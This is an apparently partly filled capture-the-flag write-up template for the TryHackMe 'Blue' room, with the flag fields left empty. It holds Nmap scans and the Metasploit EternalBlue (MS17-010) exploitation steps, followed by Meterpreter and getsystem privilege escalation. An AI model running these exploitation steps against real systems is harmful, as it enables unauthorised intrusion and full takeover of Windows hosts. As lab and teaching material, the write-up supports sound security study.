# TryHackMe — Blue

**Difficulty:** Easy
**Category:** Windows Exploitation
**Vulnerabilities:** EternalBlue (MS17-010)
**Tools Used:** Nmap, Metasploit, John the Ripper

---

## Room Overview

Blue is a beginner-friendly Windows exploitation room on TryHackMe. The target machine is running a vulnerable version of Windows 7 with SMB exposed. The objective is to exploit the EternalBlue vulnerability (MS17-010) to gain a shell, escalate privileges, and capture three flags.

---

## Methodology

### 1. Reconnaissance

Started with an Nmap scan to identify open ports and services:

```bash
nmap -sV -sC -O <target-ip>
```

**Findings:**
- Port 135 — Microsoft RPC
- Port 139 — NetBIOS
- Port 445 — SMB (Microsoft-DS)
- OS: Windows 7 Professional

### 2. Vulnerability Scanning

Ran Nmap scripts to check for MS17-010:

```bash
nmap --script smb-vuln-ms17-010 <target-ip>
```

**Result:** Target confirmed vulnerable to EternalBlue (MS17-010)

### 3. Exploitation

Launched Metasploit and selected the EternalBlue exploit module:

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-ip>
set LHOST <your-ip>
run
```

**Result:** Shell obtained

### 4. Post Exploitation

Upgraded shell to Meterpreter:

```bash
# In msfconsole
sessions -u <session-id>
```

Checked current user privileges:

```bash
getuid
getsystem
```

### 5. Flag Capture

**Flag 1:**
```
Location: 
Flag: 
```

**Flag 2:**
```
Location: 
Flag: 
```

**Flag 3:**
```
Location: 
Flag: 
```

---

## Key Takeaways

- EternalBlue exploits a vulnerability in SMBv1 — always disable SMBv1 on Windows systems
- MS17-010 was the same vulnerability used by the WannaCry ransomware in 2017
- Privilege escalation was straightforward because the service was running as SYSTEM
- Password hashes recovered from memory can be cracked offline with John the Ripper

---

## Lessons Learned

*Fill in after completing the room*

---

## References

- [MS17-010 CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144)
- [TryHackMe Blue Room](https://tryhackme.com/room/blue)
- [EternalBlue Explained](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)